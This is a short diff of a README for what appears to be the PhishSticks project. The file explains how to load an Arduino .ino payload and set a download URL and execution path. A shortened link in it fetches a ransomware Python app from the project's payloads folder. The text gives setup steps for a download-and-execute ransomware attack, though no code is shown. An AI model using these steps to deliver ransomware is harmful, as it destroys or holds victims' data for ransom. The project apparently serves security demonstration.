@@ -16,7 +16,7 @@ Check out more detailed usage of the [Ransomware in our project.](https://github
 - Download the .ino, or copy the code.    
 - Open the file or paste the content to/in Arduino IDE.
 - Define:
-	-  `DownloadFile('URL_WHERE_TO_DOWNLOAD'`
+	-  `DownloadFile('URL_WHERE_TO_DOWNLOAD'`   
 	**NOTE: As is (`https://tinyurl.com/5e8yp8mf`), it downloads it from [here](https://github.com/therealhalonen/PhishSticks/tree/master/payloads/ransomware/Python%20app)**   
 	
 	- Path, where to download and what to execute (both must be the same):
